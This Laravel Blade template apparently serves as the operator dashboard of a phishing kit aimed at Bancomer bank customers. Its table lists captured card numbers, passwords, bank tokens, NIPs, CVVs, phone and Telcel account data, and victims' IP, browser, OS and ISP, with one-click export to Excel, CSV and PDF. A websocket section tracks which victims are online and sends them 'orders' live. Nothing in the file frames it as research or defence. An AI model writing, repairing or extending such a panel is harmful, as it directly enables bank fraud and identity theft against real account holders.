@extends('layouts.app')

@section('content')
<div class="container col-md">
    <div class="row">
        <div class="col-xl-12 mb-5 mb-xl-0 mx-auto">
          <div class="card shadow">
            <div class="panel panel-default" id="panel-tabla">
                <div class="panel-heading">
                    Bancomer Personal
                    <!-- @can('bancomer.personal.create') -->
                    <a href="" 
                    class="btn btn-sm btn-primary float-right">
                        Crear
                    </a>
                    <!-- @endcan -->
                </div>
                <div class="panel-body">
                    
                <div class="panel-body table-responsive">
                    <table class="table table-striped table-hover table-sm " id="tabla">
                        <thead>
                            <tr>
                                <th></th>
                                <th>Etiquetas</th>
                                <th>Estado</th>
                                <th width="10px">ID</th>
                                <th ># Tarjeta</th>
                                <th >Nombre</th>
                                <th >Password</th>
                                <th >Token</th>
                                <th >Nip</th>
                                <th >Cvv</th>
                                <th >Compañia</th>
                                <th >Celular</th>
                                <th >Mi Telcel</th>
                                <th >Ip</th>
                                <th >Navegador</th>
                                <th >Os</th>
                                <th >Isp</th>
                                <th >Fecha I</th>
                            </tr>
                        </thead>
                        <tbody>
                        
                        </tbody>
                        <tfoot>
                            <thead>
                            <tr>
                                <th></th>
                                <th>Etiquetas</th>
                                <th>Estado</th>
                                <th width="10px">ID</th>
                                <th ># Tarjeta</th>
                                <th >Nombre</th>
                                <th >Password</th>
                                <th >Token</th>
                                <th >Nip</th>
                                <th >Cvv</th>
                                <th >Compañia</th>
                                <th >Celular</th>
                                <th >Mi Telcel</th>
                                <th >Ip</th>
                                <th >Navegador</th>
                                <th >Os</th>
                                <th >Isp</th>
                                <th >Fecha I</th>
                            </tr>
                        </thead>
                        </tfoot>
                    </table>
        
                </div>   

                </div>
            </div>
            <div class="panel pane-default" id="panel-etiquetas">
                <div class="panel-heading">
                    Bancomer etiquetas
                </div>
                <form name="formulario" id="formulario">
                    <div class="panel-body">
                        <input type="hidden" name="id_bancomer_personal" id="id_bancomer_personal">
                        <label>Tags*</label>
                        <ul style="list-style: none;" id="etiquetas"></ul>
                        
                    </div>
                    <div class="card-footer">
                        <div class="form-group col-lg-12 col-md-12 col-sm-12 col-xs-12">
                              <button class="btn btn-primary btn-sm" type="submit" id="btnGuardar"><i class="fa fa-save"></i> Guardar</button>

                              <button class="btn btn-danger btn-sm" onclick="cancelarform()" type="button"><i class="fa fa-arrow-circle-left"></i> Cancelar</button>
                            </div>
                    </div>
                </form>

            </div>
          </div>
        </div>
    </div>
</div> 
@endsection
@section('javascript')

<script>
    //oculta el form etiquetas
    $("#panel-etiquetas").hide();

    //Convierte el string de laravel a HTML tags
    function decodeHTML(str){ return $('<div>').html(str).text(); }

    //Funcion cancelarform esconde form etiquetas y muestra tabla datatable
    function cancelarform(){$("#panel-etiquetas").hide();$("#panel-tabla").show();}

    //Muestra todos los tags disponibles asi como las que estan seleccionadas por el 
    //logo personal
    function mostrar(id_bancomer_personal)
    {
        $("#panel-tabla").hide();
        $("#panel-etiquetas").show();

        var dir_etiquetas_populate = "/bancomer/etiquetas/populate";

        $.get(dir_etiquetas_populate+"/"+id_bancomer_personal,function(r){
            $("#etiquetas").html(r);
        });

        $("#id_bancomer_personal").val(id_bancomer_personal);
        
        
    }
    var arr_ordenes = new Array();
    var canal ="";
    var tabla = ""

    function enviarOrdenes(){
        console.log(arr_ordenes)
    }
    //lleno el array para mandar las ordenes, con esto puedo enviar 1,n ordenes
    //ademas que cuando le den click nuevamente a un mismo checkbox se quite del array
    function llenarArreglo(descripcion){
        if(arr_ordenes.length > 0){   
            var i;
            var bandera = false;
            for(i = 0; i < arr_ordenes.length;i++){
                if(arr_ordenes[i] == descripcion){
                    arr_ordenes.splice(i);
                    bandera = true;
                }
            }
            if(bandera == false)
                arr_ordenes.push(descripcion);
        }else
            arr_ordenes.push(descripcion);

        // console.log(arr_ordenes)
    }

    //Inicia socket
    var joinToChannel = function(channel) {
        console.log('suscrito a '+channel);

        window.Echo.channel(channel)
            .listen('.messages', (res) => {

                canal = res.data.channel;
                tabla.ajax.reload();
            });
    };

    window.Echo.channel('join_user')
        .listen('.join', (res) => {
            joinToChannel(res.data.channel);
        });


    var sendMessage = function () {
        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                // document.getElementById("messages").innerHTML += this.responseText;
            }
        };
        var message = arr_ordenes;
        var channel = canal;
        // Cookies.set(channel,"no",{expires: 1});

        console.log(message);
        // var x = Cookies.get(channel);
        // if(x){
        xhttp.open("POST", "../send-message", true);
        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhttp.send("message="+message+"&channel="+channel);
        // }else{
            // channel
        // }
        arr_ordenes.splice(0, arr_ordenes.length);
        // Cookies.set(channel,"si",{expires: 1});

    };
            

        //termina socket


    

    $(document).ready(function() {
        
        

    //funcion que envia valores a la bd
    $("#formulario").on("submit",function(e){
        e.preventDefault(); //No se activará la acción predeterminada del evento
        $("#btnGuardar").prop("disabled",true);
        var formData = new FormData($("#formulario")[0]);
        // console.log($("#formulario")[0])
        $.ajax({
            url: "{{ route('bancomer.personal.etiquetas.update') }}",
            type: "post",
            headers: {
                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
            },
            data: formData,
            contentType: false,
            processData: false,
            success: function(datos)
            {
                  toastr.success("Etiqueta(s) actualizada(s) exitosamente!");
                  cancelarform();
                  tabla.ajax.reload();
                  $("#btnGuardar").prop("disabled",false);
            }

        });
    });

    /* Formatting function for row details - modify as you need */
    function format ( d ) {
       return decodeHTML( d['formatoTag']);
    }

     tabla =  $('#tabla').DataTable({
          "aProcessing":true,
          "aServerSide":true,
          dom: 'Bfrtip',
          buttons:[
            'copyHtml5',
            'excelHtml5',
            'csvHtml5',
            {
                extend: 'pdfHtml5',
                orientation: 'landscape',
                pageSize: 'LEGAL'
            }
          ],
          "ajax":
                {
                    url: "{{ route('bancomer.personal.populate') }}",
                    type : "get",
                    dataType : "json",
                    error: function(e){
                        console.log(e.responseText);
                    }
                },
          "columns":[
                {
                    "className":      'details-control',
                    "orderable":      false,
                    "data":           null,
                    "defaultContent": ''
                },
                {"data":"botones"},
                {"data":"estatus" },
                {"data":"id"},
                {"data":"n_tarjeta"},
                {"data":"nombre"},
                {"data":"contrasena"},
                {"data":"token"},
                {"data":"nip"},
                {"data":"cvv"},
                {"data":"compania"},
                {"data":"telefono"},
                {"data":"mi_telcel"},
                {"data":"ip"},
                {"data":"navegador"},
                {"data":"os"},
                {"data":"isp"},
                {"data":"created_at"},
          ],
          "aoColumnDefs": [
                
               {
                    "aTargets": [1],
                    // "aTargets": [0],
                    "mData": "botones",
                    "mRender": function (data, type, full) {
                        return '<div class="row"><input type="hidden" value="'+data+'" id="id_bancomer_personal_hidden"><button class="btn btn-primary btn-sm" style="margin-right: 2px;"  onclick="mostrar('+data+')"><i class="fa fa-tags"></i></button></div>';
                    }
                },
               {
                    "aTargets": [2],
                    // "aTargets": [0],
                    "mData": "estatus",
                    "mRender": function (data, type, full) {
                        if(data == "OnLine")
                            return '<span class="label label-info bg-white">'+data+'</span>';
                        else
                            return '<span class="label label-danger bg-white">'+data+'</span>';
                    }
                },
               {
                    "aTargets": [14],
                    // "aTargets": [0],
                    "mData": "estatus",
                    "mRender": function (data, type, full) {
                        if(data == "Internet explorer")
                            return '<img src="{{asset("images/explorador.svg")}}" alt="Internet Explorer" height="25px" />'
                        else if(data == "Mozilla Firefox")
                            return '<img src="{{asset("images/firefox.svg")}}" alt="Firefox" height="25px" />'
                        else if(data == "Google Chrome")
                            return '<img src="{{asset("images/cromo.svg")}}" alt="Chrome" height="25px" />'
                        else if(data == "Opera Mini")
                            return '<img src="{{asset("images/opera.svg")}}" alt="Opera Mini" height="25px" />'
                        else if(data == "Opera")
                            return '<img src="{{asset("images/opera.svg")}}" alt="Opera" height="25px" />'
                        else if(data == "Safari")
                            return '<img src="{{asset("images/safari.svg")}}" alt="Safari" height="25px" />'
                        else if(data == "Something else")
                            return '<img src="{{asset("images/navegador.svg")}}" alt="Desconocido" height="25px" />'

                    }
                },
                {
                    "aTargets": [15],
                    // "aTargets": [0],
                    "mData": "estatus",
                    "mRender": function (data, type, full) {
                        if(data == "Windows")
                            return '<img src="{{asset("images/microsoft.svg")}}" alt="microsoft" height="25px" />'
                        else if(data == "Linux")
                            return '<img src="{{asset("images/linux.svg")}}" alt="linux" height="25px" />'
                        else if(data == "Android")
                            return '<img src="{{asset("images/androide.svg")}}" alt="androide" height="25px" />'
                        else if(data == "Mac")
                            return '<img src="{{asset("images/mac.svg")}}" alt="mac" height="25px" />'
                        else if(data == "Firefox OS")
                            return '<img src="{{asset("images/firefox.svg")}}" alt="firefox os" height="25px" />'
                        else 
                            return '<img src="{{asset("images/navegador.svg")}}" alt="Desconocido" height="25px" />'

                    }
                }
            ],
          "bDestroy":true,
          "iDisplayLength":100,
          "order":[[0,"desc"]],
          "language": {
            "paginate": {
              "previous": "Ant.",
              "next": "Sig."
            },
          }
      });

      
       var detailRows = [];
    // Add event listener for opening and closing details
    $('#tbllistado tbody').on('click', 'tr td.details-control', function () {
        var tr = $(this).closest('tr');

        // var tr = $(this.node());
        var row = tabla.row( tr );
        var idx = $.inArray( row.data()[1], detailRows );
        
        // this.child(format(tr.data('child-value'))).show();
        // tr.addClass('shown');

        if ( row.child.isShown() ) {
            row.child.hide();
            tr.removeClass('shown');
            // Remove from the 'open' array
            detailRows.splice( idx, 1 );

        }else {
            
            row.child( format(row.data()) ).show();
            tr.addClass('shown');

            // Add to the 'open' array
            if ( idx === -1 ) {
                detailRows.push( tr.attr('id') );
            }
        }
    } );

    tabla.on('draw.dt', function () {
        tabla.rows().every(function () {
          this.child(  format(this.data())  ).show();
          this.nodes().to$().addClass('shown');
        });
    });


    });
  </script>
@endsection